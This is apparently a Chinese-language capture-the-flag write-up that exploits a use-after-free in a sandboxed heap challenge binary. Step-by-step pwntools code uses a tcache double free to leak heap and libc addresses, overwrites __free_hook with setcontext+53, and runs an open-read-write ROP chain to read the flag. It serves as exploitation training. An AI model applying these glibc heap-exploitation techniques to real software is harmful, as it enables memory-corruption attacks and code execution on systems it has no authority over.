程序分析

checksec可以看到保护全开

在IDA中打开分析程序，首先可以看到再程序的sub_9da函数中存在prctl沙箱

使用seccomp-tools工具分析可得知，程序仅禁用了execve的系统调用，使我们无法再用之前的方法getshell了

其次可以看到堆题中常见的三个功能：add、show、delete

其中add函数无明显漏洞，但在创建堆块时有做要求，即数量不能大于8、大小不能小于0x80 不能大于0x400

show 函数即正常的打印content中的数据

delete函数中在对堆块free过后，未对其指针进行清零，即出现UAF漏洞

利用过程

  1. 泄露heap地址

    由于前面创建堆块时的种种限制，对此我们可以利用doublefree的方式将堆块申请到tcache中，但前提我们需要先得到堆块的地址

        add(0x80,"a") #idx_0
        dele(0)
        dele(0)
        show(0)
        sh.recvuntil("Content: ")
        heap_addr = u64(sh.recv(6).ljust(8,b"\x00"))-0x260
        success("heap_addr => 0x%x",heap_addr)

  2. 控制tcache，泄露libc地址

    得到堆块地址后，继续通过doublefree，控制堆块申请到tcache结构体上，同时设置其0x90大小的堆块数量超过7，即可在下一次free该大小的堆块时，使其跳出tcache，从而进入unsortedbin中，进而得到其fd、bk指针中的main_arena的地址继而泄露libc地址

     add(0x80,p64(heap_addr))    #idx_1
        add(0x80,"a")   #idx_2
        add(0x80,p64(0)+p64(0x250)+p64(0x1000000000000000))#idx_3
        add(0x90,"b") #下一步用
        dele(1)
        show(1)
        sh.recvuntil("Content: ")
        main_arena96 = u64(sh.recvuntil(b"\x7f")[:6].ljust(8,b"\x00"))
        libc_base = main_arena96-96-0x10-libc.sym["__malloc_hook"]
        free_hook = libc_base + libc.sym["__free_hook"]
        setcontext = libc_base + libc.sym["setcontext"] + 53
        success("libc_base => 0x%x",libc_base)
        success("free_hook => 0x%x",free_hook)
        success("setcontext => 0x%x",setcontext)

  3. 之后利用setcontext+53的gadgets，将其写到free_hook中，为后续的orw做准备

     dele(3)
        dele(3)
        add(0x90,p64(free_hook))
        add(0x90,p64(0)) #idx_3
        # debug("b free")
        add(0x90,p64(setcontext)) #idx_4

  4. 再构造payload，用于再控制setcontext后跳转到rsp进而执行open->read->write函数来读取flag


        fake_rsp = heap_addr+0x380+0xd0
        flag_addr = fake_rsp -0x10
        sc_addr = heap_addr + (0x2e0+0x90+0x20)
        pop_rdi = libc_base + 0x2155f
        pop_rsi = libc_base + 0x23e6a
        pop_rdx_rsi = libc_base + 0x1306d9
        pop_rax = libc_base + 0x439c8
        ret = libc_base + 0x8aa

        payload = b'a'*0xa0 + p64(fake_rsp) + p64(ret)
        payload = payload.ljust(0xb0, b'\x00')
        payload += b'./flag'.ljust(0x10,b'\x00')
        payload += p64(pop_rdi) + p64(flag_addr)
        payload += p64(pop_rsi) + p64(0)
        payload += p64(libc_base + libc.sym['open'])
        payload += p64(pop_rdi) + p64(3)
        payload += p64(pop_rdx_rsi) + p64(0x30) + p64(fake_rsp+0x100)
        payload += p64(libc_base + libc.sym['read'])
        payload += p64(pop_rdi) + p64(1)
        payload += p64(pop_rdx_rsi) + p64(0x30) + p64(fake_rsp+0x100)
        payload += p64(libc_base + libc.sym['write'])

        add(0x300,payload)  #idx_5

  5. 最后将payload写到堆块中，当free该堆块时，触发free_hook中的setcontext进而得到flag

        add(0x300,payload)  #idx_5
        sh.sendlineafter("Your choice :","3")
        sh.sendlineafter("Index :","5")
